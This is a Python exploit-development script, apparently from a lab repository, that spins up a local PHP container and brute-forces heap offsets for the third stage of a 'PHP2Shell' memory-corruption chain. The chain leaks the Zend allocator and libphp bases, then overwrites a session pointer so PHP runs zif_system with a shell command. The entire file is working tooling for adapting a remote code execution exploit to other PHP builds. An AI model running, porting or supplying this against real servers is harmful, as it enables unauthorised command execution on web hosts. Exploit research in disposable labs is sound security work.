#!/usr/bin/env python3
"""Stage-3 offset sweep for PHP2Shell.

Stages 1 and 2 leak the Zend MM chunk base and the libphp base. Stage 3 then
places a fake HashTable at a *heap address* and overwrites a session pointer
so the engine calls zif_system with a command string.

The heap address is expressed as chunk_base + OFFSET. OFFSET is build-specific:
it depends on where the 167-byte payload allocation lands inside the chunk for
the fixed request shape, which shifts with the Zend MM bin layout of each PHP
branch. Upstream ships three offsets measured on 8.4.x (0x690D8, 0x6E0D8,
0x5404A) and none of them works on 8.3.x.

This tool re-derives stages 1-2 for the target build and then sweeps OFFSET
around a candidate base, checking for real command execution (a proof file
written by the container) after every attempt.

Local disposable containers only.
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--image", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--name", required=True)
    ap.add_argument("--bases", default="0x690d8",
                    help="comma separated offset bases to sweep around")
    ap.add_argument("--span", type=int, default=0x400,
                    help="+/- window around each base")
    ap.add_argument("--step", type=int, default=8)
    ap.add_argument("--pads", default="bookworm,lab")
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    M.docker("rm", "-f", args.name)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", args.name))
    proof = os.path.join(outdir, "p1")
    M.docker(
        "run", "-d", "--name", args.name,
        "-p", f"127.0.0.1:{args.port}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        args.image, timeout=900,
    )
    url = f"http://127.0.0.1:{args.port}/index.php"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")

    sym = C.extract_symbols(VENDOR, args.name)
    mod = C.load_upstream(VENDOR)
    t = mod.Target(url, verbose=False)
    ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm", verbose=False)

    print(f"[*] {args.image} zif={hex(sym['zif_system'])} dtor={hex(sym['zval_ptr_dtor'])}")
    chunk, n, flen = C.calibrate_stage1(mod, ex, {})
    if not chunk:
        print("[!] stage-1 leak failed; nothing to sweep")
        M.docker("rm", "-f", args.name)
        return 2
    lib, tidx = C.calibrate_stage2(mod, ex, sym["zval_ptr_dtor"], {})
    if not lib:
        print("[!] stage-2 leak failed; nothing to sweep")
        M.docker("rm", "-f", args.name)
        return 2
    print(f"[*] chunk={hex(chunk)} libphp={hex(lib)}")

    bases = [int(b, 0) for b in args.bases.split(",") if b]
    pad_variants = args.pads.split(",")
    tried = []
    t0 = time.time()
    for base in bases:
        for off in range(base - args.span, base + args.span + 1, args.step):
            for pads in pad_variants:
                if os.path.exists(proof):
                    os.unlink(proof)
                if pads == "lab":
                    ex.stage3_carrier = False
                    ex.stage3_pads = [(8, 7)] + [(7, 7)] * 5
                else:
                    ex.stage3_carrier = True
                    ex.stage3_pads = [(31, 31)] * 6
                try:
                    ex.rotate()
                    ex.stage3(chunk + off, lib + sym["zif_system"])
                except Exception as exc:
                    print(f"    off={hex(off)} pads={pads}: {exc}")
                if os.path.exists(proof) and os.path.getsize(proof) > 0:
                    out = open(proof).read().strip()
                    print(f"[+] off={hex(off)} pads={pads}: {out}")
                    rec = {"off": hex(off), "pads": pads, "proof": out,
                           "chunk": hex(chunk), "libphp": hex(lib)}
                    if args.out:
                        json.dump(rec, open(args.out, "w", encoding="utf-8"), indent=2)
                    M.docker("rm", "-f", args.name)
                    return 0
                tried.append({"off": hex(off), "pads": pads})
            done = len(tried)
            if done % 50 == 0:
                rate = done / max(time.time() - t0, 1)
                print(f"    .. {done} attempts ({rate:.2f}/s)", flush=True)
    print(f"[!] no stage-3 execution found in {len(tried)} attempts")
    if args.out:
        json.dump({"tried": len(tried), "chunk": hex(chunk), "libphp": hex(lib)},
                  open(args.out, "w", encoding="utf-8"), indent=2)
    M.docker("rm", "-f", args.name)
    return 1


if __name__ == "__main__":
    sys.exit(main())
